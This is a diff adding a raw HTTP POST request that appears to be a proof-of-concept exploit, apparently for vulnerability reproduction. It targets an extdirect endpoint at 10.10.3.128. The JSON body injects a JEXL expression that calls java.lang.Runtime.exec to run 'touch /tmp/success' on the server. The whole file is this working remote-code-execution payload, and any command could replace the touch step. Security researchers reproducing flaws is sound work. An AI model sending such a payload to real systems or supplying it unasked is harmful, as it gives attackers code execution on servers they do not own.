@@ -1,0 +1,11 @@
+POST /service/extdirect HTTP/1.1
+Host: 10.10.3.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: */*
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 370
+Connection: close
+
+{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":
+[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}
